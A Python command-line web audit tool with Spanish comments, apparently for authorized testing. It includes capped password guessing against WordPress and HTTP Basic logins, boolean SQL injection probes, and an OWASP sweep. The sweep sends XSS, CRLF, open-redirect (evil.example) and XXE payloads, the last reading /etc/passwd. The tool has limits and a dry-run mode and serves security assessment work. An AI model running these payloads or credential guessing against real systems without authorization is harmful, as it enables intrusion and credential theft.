#!/usr/bin/env python3
"""Pruebas web acotadas para cuentas y formularios autorizados."""

import argparse
import http.cookiejar
import os
from pathlib import Path
import pwd
import time
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl
from urllib.request import HTTPCookieProcessor, HTTPRedirectHandler, Request, build_opener


class SinRedireccion(HTTPRedirectHandler):
    def redirect_request(self, request, fp, code, msg, headers, newurl):
        return None


def validar_url(url):
    partes = urlsplit(url)
    if partes.username or partes.password or partes.fragment:
        raise ValueError("URL con credenciales o fragmento no admitida")
    if partes.scheme == "https" and partes.hostname:
        return url
    if partes.scheme == "http" and partes.hostname in {"127.0.0.1", "localhost", "::1"}:
        return url
    raise ValueError("usa HTTPS o HTTP en localhost")


def consultar(opener, url, datos=None):
    peticion = Request(url, data=datos, headers={"User-Agent": "kit-auditoria-claves/1.0"})
    try:
        respuesta = opener.open(peticion, timeout=20)
    except HTTPError as exc:
        respuesta = exc
    cuerpo = respuesta.read(65536)
    estado, cabeceras = respuesta.status, respuesta.headers
    respuesta.close()
    return estado, cabeceras, cuerpo


def candidatos(ruta, maximo):
    with Path(ruta).open(encoding="utf-8") as archivo:
        for linea in archivo:
            candidato = linea.rstrip("\r\n")
            if candidato and not candidato.startswith("#") and len(candidato) <= 128:
                yield candidato
                maximo -= 1
                if maximo == 0:
                    return


def ruta_lista(ruta):
    ruta = str(ruta)
    if ruta.startswith("~/") and os.geteuid() == 0 and os.environ.get("SUDO_USER"):
        try:
            return Path(pwd.getpwnam(os.environ["SUDO_USER"]).pw_dir) / ruta[2:]
        except KeyError as exc:
            raise ValueError("usuario original de sudo no encontrado") from exc
    return Path(ruta).expanduser()


def login(url, usuario, lista, limite, seco=False, pausa=1):
    validar_url(url)
    lista = ruta_lista(lista)
    if not 1 <= limite <= 50:
        raise ValueError("--limite-intentos debe estar entre 1 y 50")
    if not usuario or len(usuario) > 64 or "\n" in usuario or "\r" in usuario:
        raise ValueError("indica un usuario válido")
    if not Path(lista).is_file():
        raise ValueError("lista de candidatos no encontrada")
    if seco:
        print(f"Plan: hasta {limite} primeros candidatos válidos de la lista en {url}; sin guardar candidatos")
        return 0
    cookies = http.cookiejar.CookieJar()
    opener = build_opener(HTTPCookieProcessor(cookies), SinRedireccion())
    try:
        estado, _, _ = consultar(opener, url)
    except (URLError, TimeoutError) as exc:
        print(f"No se pudo cargar el formulario: {exc}")
        return 3
    if estado != 200:
        print(f"La página de acceso respondió HTTP {estado}; no se enviaron intentos")
        return 3
    hechos = 0
    for candidato in candidatos(lista, limite):
        datos = urlencode({"log": usuario, "pwd": candidato, "wp-submit": "Log In",
                           "testcookie": "1", "redirect_to": "/wp-admin/"}).encode()
        try:
            estado, _, _ = consultar(opener, url, datos)
        except (URLError, TimeoutError) as exc:
            print(f"Error de conexión en el intento {hechos + 1}; estado desconocido: {exc}")
            return 3
        hechos += 1
        if any(cookie.name.startswith("wordpress_logged_in_") for cookie in cookies):
            print(f"Acceso confirmado tras {hechos} intentos; candidato oculto")
            return 0
        if estado in {403, 429}:
            print(f"Control o bloqueo observado: HTTP {estado} tras {hechos} intentos")
            return 0
        if estado not in {200, 301, 302, 303}:
            print(f"Respuesta inesperada HTTP {estado}; se detiene la prueba")
            return 3
        if hechos < limite:
            time.sleep(pausa)
    unidad = "intento" if hechos == 1 else "intentos"
    print(f"Sin acceso confirmado en {hechos} {unidad}; no demuestra ausencia de protección")
    return 1


def url_con_parametro(url, nombre, valor):
    partes = urlsplit(url)
    pares = [(k, v) for k, v in parse_qsl(partes.query, keep_blank_values=True) if k != nombre]
    pares.append((nombre, valor))
    return urlunsplit((partes.scheme, partes.netloc, partes.path, urlencode(pares), ""))


def sqli(url, parametro, valor, indicador, seco=False):
    validar_url(url)
    if not parametro or not indicador or len(parametro) > 64 or len(valor) > 128 or len(indicador) > 128:
        raise ValueError("indica --param y --indicador")
    if seco:
        print(f"Plan: tres consultas GET al formulario {url}; parámetro={parametro}; sin extraer datos")
        return 0
    opener = build_opener(SinRedireccion())
    pruebas = (valor, valor + "' AND '1'='1", valor + "' AND '1'='2")
    observaciones = []
    for prueba in pruebas:
        try:
            estado, _, cuerpo = consultar(opener, url_con_parametro(url, parametro, prueba))
        except (URLError, TimeoutError) as exc:
            print(f"Error de conexión: {exc}")
            return 3
        if estado != 200:
            print(f"Respuesta HTTP {estado}; resultado inconcluyente")
            return 3
        observaciones.append(indicador.encode() in cuerpo)
    if observaciones == [True, True, False]:
        print("Diferencia compatible con SQLi booleana; requiere confirmación manual")
        return 0
    print("No se observó el patrón de SQLi booleana; resultado inconcluyente")
    return 1


def basic(url, usuario, lista, limite, seco=False, pausa=1):
    """Fuerza bruta acotada contra autenticación HTTP Basic."""
    validar_url(url)
    lista = ruta_lista(lista)
    if not 1 <= limite <= 200:
        raise ValueError("--limite-intentos debe estar entre 1 y 200")
    if not usuario or len(usuario) > 64 or "\n" in usuario or "\r" in usuario:
        raise ValueError("indica un usuario válido")
    if not lista.is_file():
        raise ValueError("lista de candidatos no encontrada")
    if seco:
        print(f"Plan: hasta {limite} candidatos contra HTTP Basic de {url} como {usuario}; "
              "sin guardar candidatos")
        return 0
    import base64
    opener = build_opener(SinRedireccion())

    def consultar(credencial=None):
        headers = {"User-Agent": "kit-auditoria-claves/1.0"}
        if credencial is not None:
            headers["Authorization"] = f"Basic {credencial}"
        peticion = Request(url, headers=headers)
        try:
            respuesta = opener.open(peticion, timeout=20)
            estado = respuesta.status
            cabeceras = respuesta.headers
            respuesta.close()
            return estado, cabeceras
        except HTTPError as exc:
            estado, cabeceras = exc.code, exc.headers
            exc.close()
            return estado, cabeceras
        except (URLError, TimeoutError) as exc:
            print(f"Error de conexión; estado desconocido: {exc}")
            return None

    # Comprobar el reto sin enviar una credencial de autenticación.
    sonda = consultar()
    if sonda is None:
        return 3
    estado_sonda, cabeceras = sonda
    if estado_sonda != 401 or "basic" not in cabeceras.get("WWW-Authenticate", "").lower():
        print(f"El recurso respondió {estado_sonda} sin un reto HTTP Basic; test no aplicable")
        return 3
    hechos = 0
    for candidato in candidatos(lista, limite):
        credencial = base64.b64encode(f"{usuario}:{candidato}".encode()).decode()
        respuesta = consultar(credencial)
        if respuesta is None:
            return 3
        estado, _ = respuesta
        hechos += 1
        if estado == 401:
            if hechos < limite:
                time.sleep(pausa)
            continue
        if estado in {403, 407}:
            print(f"Control o restricción HTTP {estado}; resultado inconcluyente")
            return 3
        if estado == 429:
            print(f"Bloqueado por límite de peticiones (429) tras {hechos} intentos; "
                  "resultado inconcluyente")
            return 3
        if 500 <= estado <= 599:
            print(f"Error del servidor ({estado}) en el intento {hechos}; resultado inconcluyente")
            return 3
        if 300 <= estado <= 399:
            print(f"Redirección ({estado}) tras {hechos} intentos: posible acceso pero "
                  "requiere confirmación manual; no se declara éxito")
            return 3
        if 200 <= estado <= 299:
            print(f"Acceso HTTP Basic confirmado tras {hechos} intentos; candidato oculto")
            return 0
        print(f"Estado inesperado {estado} tras {hechos} intentos; resultado inconcluyente")
        return 3
    unidad = "intento" if hechos == 1 else "intentos"
    print(f"Sin acceso en {hechos} {unidad}; no demuestra que la contraseña sea fuerte")
    return 1


FIRMAS_SQL = ("you have an error in your sql syntax",
              "warning: mysql", "mysqli_sql_exception", "pg_query()",
              "sqlite3::sqlexception", "sqlstate[", "odbc sql server driver",
              "quoted string not properly terminated")
SENSIBLE = (("tarjeta de crédito", r"\b(?:\d{4}[- ]){3}\d{4}\b"),
            ("clave AWS", r"\bAKIA[0-9A-Z]{16}\b"),
            ("private key", r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"))


def owasp(url, parametro=None, xml_url=None, seco=False):
    """Barrido OWASP rápido y acotado (~20 peticiones): cabeceras de
    seguridad, cookies, listados y ficheros expuestos, XSS reflejado,
    SQLi por error, open redirect, CRLF, método TRACE y datos sensibles
    en la portada. Inspirado en el top-10 de frohrer.com y sus scripts;
    sin falsas garantías: cada hallazgo es una pista a confirmar."""
    partes = urlsplit(url)
    if partes.scheme not in {"http", "https"} or not partes.hostname:
        raise ValueError("--url debe ser http(s)://host[/ruta]")
    if seco:
        print(f"Plan: barrido OWASP de ~20 GET/POST acotados contra "
              f"{url}: cabeceras, "
              "cookies, .git/.env/robots, listado de directorios, XSS "
              "reflejado, SQLi por error, open redirect, CRLF, TRACE, "
              "datos sensibles" + (" y XXE en --xml-url" if xml_url else ""))
        return 0
    opener = build_opener(SinRedireccion, HTTPCookieProcessor())
    hallazgos = 0

    def avisa(grado, texto):
        nonlocal hallazgos
        if grado == "HALLAZGO":
            hallazgos += 1
        print(f"{grado}: {texto}")

    estado, cab, cuerpo = consultar(opener, url)
    base = f"{partes.scheme}://{partes.netloc}"
    cuerpo_txt = cuerpo.decode("utf-8", "replace")
    avisa("info", f"GET {url} -> {estado} "
          f"(server: {cab.get('Server', 'oculto')})")
    if "Index of /" in cuerpo_txt[:400]:
        avisa("HALLAZGO", "listado de directorios activo en la portada")
    cab_low = {k.lower(): v for k, v in cab.items()}
    if partes.scheme == "https":
        if "strict-transport-security" not in cab_low:
            avisa("HALLAZGO", "HTTPS sin HSTS (Strict-Transport-Security)")
    if not any(x in cab_low for x in ("x-frame-options", "content-security-policy")):
        avisa("HALLAZGO", "sin X-Frame-Options ni CSP: clickjacking posible")
    if "x-content-type-options" not in cab_low:
        avisa("info", "sin X-Content-Type-Options: sniffing MIME posible")
    for cookie in cab.get_all("Set-Cookie") or []:
        faltan = [f for f, ok in (("HttpOnly", "httponly" in cookie.lower()),
                                  ("Secure", "secure" in cookie.lower()),
                                  ("SameSite", "samesite" in cookie.lower()))
                  if not ok]
        if faltan and "=" in cookie and cookie.split("=")[1].strip(";"):
            avisa("HALLAZGO", f"cookie '{cookie.split('=')[0]}' sin "
                  f"{', '.join(faltan)}")
    for ruta_prueba, firma in (("/.git/config", "[core]"),
                               ("/.env", "="),
                               ("/composer.json", '"require"')):
        e2, _, c2 = consultar(opener, base + ruta_prueba)
        if e2 == 200 and firma in c2.decode("utf-8", "replace"):
            avisa("HALLAZGO", f"{ruta_prueba} accesible (revisa qué fuga)")
    e2, _, c2 = consultar(opener, base + "/robots.txt")
    if e2 == 200:
        desallow = [l.split(":", 1)[1].strip()
                    for l in c2.decode("utf-8", "replace").splitlines()
                    if l.lower().startswith("disallow") and ":" in l]
        if desallow:
            avisa("info", "robots.txt delata rutas: " + ", ".join(desallow[:6]))
    marcador = "kitxss9f3"
    for nombre in ([parametro] if parametro else ("id", "q", "page")):
        prueba = f"{url}{'&' if '?' in url else '?'}{nombre}={marcador}%3C%71%3E"
        e2, _, c2 = consultar(opener, prueba)
        texto = c2.decode("utf-8", "replace")
        if marcador + "<q>" in texto:
            avisa("HALLAZGO", f"XSS reflejado SIN escapar en ?{nombre} "
                  f"(marcador con <q> literal)")
            break
        if marcador in texto:
            avisa("info", f"?{nombre} refleja pero escapa el HTML")
    e2, _, c2 = consultar(opener, f"{url}{'&' if '?' in url else '?'}"
                          f"{'id' if '?' not in url else parametro or 'id'}=1%27")
    texto = c2.decode("utf-8", "replace").lower()
    for firma in FIRMAS_SQL:
        if firma in texto:
            avisa("HALLAZGO", f"SQLi probable: el apóstrofo disparó «{firma}»")
            break
    e2, loc, _ = consultar(opener, f"{url}{'&' if '?' in url else '?'}"
                           f"next={base.replace('http', 'http', 1)}"
                           ".kit-redirect.test%2f%2f@evil.example")
    if e2 in (301, 302, 303, 307, 308) and "evil.example" in (loc.get("Location") or ""):
        avisa("HALLAZGO", "open redirect: el parámetro next= saca del dominio")
    e2, cab3, _ = consultar(opener, base + "/kit%0d%0aKitCRLF-marker")
    if any("KitCRLF-marker" in str(v) for v in cab3.values()):
        avisa("HALLAZGO", "inyección CRLF en cabeceras (ruta reflejada)")
    peticion = Request(base, data=b"", method="TRACE")
    try:
        e2, _, c2 = opener.open(peticion, timeout=15).status, None, None
    except HTTPError as exc:
        e2 = exc.code
    except URLError:
        e2 = 0
    if e2 == 200:
        avisa("HALLAZGO", "método TRACE habilitado (XST / robo de cookies)")
    for nombre, patron in SENSIBLE:
        import re as _re
        if _re.search(patron, cuerpo_txt):
            avisa("HALLAZGO", f"portada con posible {nombre} en claro")
    if xml_url:
        xxe = ('<?xml version="1.0"?><!DOCTYPE k [<!ENTITY xxe SYSTEM '
               '"file:///etc/passwd">]><k>&xxe;</k>').encode()
        peticion = Request(xml_url, data=xxe, method="POST",
                           headers={"Content-Type": "application/xml"})
        try:
            respuesta = opener.open(peticion, timeout=20)
            texto = respuesta.read(65536).decode("utf-8", "replace")
        except HTTPError as exc:
            texto = exc.read(65536).decode("utf-8", "replace")
        if "root:x:" in texto:
            avisa("HALLAZGO", f"XXE en {xml_url}: /etc/passwd reflejado")
    print(f"total: {hallazgos} hallazgos (cada uno es pista, no sentencia; "
          "confírmalos a mano)")
    return 0 if hallazgos else 1


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="accion", required=True)
    wp = sub.add_parser("web-login")
    wp.add_argument("--url", required=True)
    wp.add_argument("--usuario", required=True)
    wp.add_argument("--wl", default=str(Path(__file__).with_name("ejemplos") /
                                         "candidatos_web_ficticios.txt"))
    wp.add_argument("--limite-intentos", type=int, default=3)
    wp.add_argument("--dry-run", action="store_true")
    sql = sub.add_parser("web-sqli")
    sql.add_argument("--url", required=True)
    sql.add_argument("--param", required=True)
    sql.add_argument("--valor", required=True)
    sql.add_argument("--indicador", required=True)
    sql.add_argument("--dry-run", action="store_true")
    ow = sub.add_parser("web-owasp")
    ow.add_argument("--url", required=True)
    ow.add_argument("--param", help="parámetro a sondear para XSS/SQLi "
                                    "(por defecto id, q, page)")
    ow.add_argument("--xml-url", help="endpoint XML para la prueba XXE")
    ow.add_argument("--dry-run", action="store_true")
    bas = sub.add_parser("web-basic")
    bas.add_argument("--url", required=True)
    bas.add_argument("--usuario", required=True)
    bas.add_argument("--wl", default=str(Path(__file__).with_name("ejemplos") /
                                         "candidatos_web_ficticios.txt"))
    bas.add_argument("--limite-intentos", type=int, default=3)
    bas.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()
    try:
        if args.accion == "web-owasp":
            return owasp(args.url, args.param, args.xml_url, args.dry_run)
        if args.accion == "web-login":
            return login(args.url, args.usuario, args.wl, args.limite_intentos, args.dry_run)
        if args.accion == "web-basic":
            return basic(args.url, args.usuario, args.wl, args.limite_intentos, args.dry_run)
        return sqli(args.url, args.param, args.valor, args.indicador, args.dry_run)
    except (OSError, ValueError) as exc:
        parser.error(str(exc))


if __name__ == "__main__":
    raise SystemExit(main())
